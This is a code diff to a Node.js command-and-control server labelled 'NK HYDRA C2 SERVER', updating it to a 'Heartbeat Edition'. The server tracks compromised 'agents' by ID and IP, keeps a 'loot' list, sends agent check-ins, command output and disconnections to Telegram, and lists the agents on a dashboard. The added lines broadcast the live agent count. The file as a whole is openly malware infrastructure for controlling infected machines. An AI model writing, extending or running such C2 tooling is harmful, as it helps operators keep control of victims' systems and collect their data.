@@ -1,4 +1,4 @@
-// NK HYDRA C2 SERVER v7.0 (Telegram Integration)
+// NK HYDRA C2 SERVER v8.0 (Heartbeat Edition)
 const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
@@ -32,6 +32,12 @@ app.use(express.json());
 let agents = new Map();
 let loot = [];
 
+// Helper to broadcast status
+const broadcastStatus = () => {
+    const count = agents.size;
+    io.emit('status', { agents: count, active: true });
+};
+
 // 1. DASHBOARD
 app.get('/', (req, res) => {
     const agentsList = Array.from(agents.values()).map(a => a.id + ' (' + a.ip + ')').join('<br>');
@@ -41,6 +47,9 @@ app.get('/', (req, res) => {
 // 2. SOCKET HANDLER
 io.on('connection', (socket) => {
     
+    // Broadcast status to new UI connections immediately
+    broadcastStatus();
+
     // AGENT IDENTIFICATION
     socket.on('identify', ({ type, id, os, ip }) => {
         if (type === 'agent') {
@@ -55,6 +64,7 @@ OS: ${os}`;
             sendTelegram(msg);
             
             io.emit('log', `[SYSTEM] NEW NODE: ${id}`);
+            broadcastStatus();
         }
     });
 
@@ -95,6 +105,7 @@ Dados: <code>${String(output).substring(0, 200)}...</code>`;
             console.log(`[-] AGENT OFFLINE: ${disconnectedId}`);
             sendTelegram(`💔 <b>AGENTE OFFLINE:</b> ${disconnectedId}`);
             io.emit('log', `[SYSTEM] NODE LOST: ${disconnectedId}`);
+            broadcastStatus();
         }
     });
 });
